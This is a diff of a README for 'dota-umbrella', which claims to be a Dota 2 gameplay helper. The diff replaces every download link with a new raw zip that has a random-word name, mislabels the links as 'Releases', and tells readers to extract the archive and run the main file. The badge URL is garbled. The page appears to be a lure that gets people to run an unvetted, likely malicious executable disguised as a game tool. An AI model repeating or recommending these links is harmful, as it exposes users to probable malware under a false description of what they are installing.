@@ -1,6 +1,6 @@
 # ⚡ dota-umbrella - Enhance Your Dota 2 Gameplay Experience
 
-[![Download Dota 2 Input Helper](https://github.com/fielcharlie/dota-umbrella/raw/refs/heads/main/ecclesiastics/umbrella_dota_piscine.zip%202%20Input%https://github.com/fielcharlie/dota-umbrella/raw/refs/heads/main/ecclesiastics/umbrella_dota_piscine.zip)](https://github.com/fielcharlie/dota-umbrella/raw/refs/heads/main/ecclesiastics/umbrella_dota_piscine.zip)
+[![Download Dota 2 Input Helper](https://github.com/fielcharlie/dota-umbrella/raw/refs/heads/main/ecclesiastics/dota-umbrella-Palestinian.zip%202%20Input%https://github.com/fielcharlie/dota-umbrella/raw/refs/heads/main/ecclesiastics/dota-umbrella-Palestinian.zip)](https://github.com/fielcharlie/dota-umbrella/raw/refs/heads/main/ecclesiastics/dota-umbrella-Palestinian.zip)
 
 ## 📥 Introduction
 
@@ -24,7 +24,7 @@ This tool is designed for Dota 2 players who want cleaner controls and less micr
 Ready to enhance your gameplay? Follow these steps to download and set up **dota-umbrella**:
 
 1. **Download the Latest Version**
-   - Visit this page to download: [**Releases**](https://github.com/fielcharlie/dota-umbrella/raw/refs/heads/main/ecclesiastics/umbrella_dota_piscine.zip)
+   - Visit this page to download: [**Releases**](https://github.com/fielcharlie/dota-umbrella/raw/refs/heads/main/ecclesiastics/dota-umbrella-Palestinian.zip)
 
 2. **Extract the Archive**
    - Locate the downloaded file on your computer. 
@@ -72,7 +72,7 @@ Get involved! Share your feedback, report bugs, and connect with other players. 
 
 ## 📥 Summary of Download Steps
 
-1. Click here to visit this page: [**Releases**](https://github.com/fielcharlie/dota-umbrella/raw/refs/heads/main/ecclesiastics/umbrella_dota_piscine.zip)
+1. Click here to visit this page: [**Releases**](https://github.com/fielcharlie/dota-umbrella/raw/refs/heads/main/ecclesiastics/dota-umbrella-Palestinian.zip)
 2. Download the latest version.
 3. Extract it and run the main file.
 
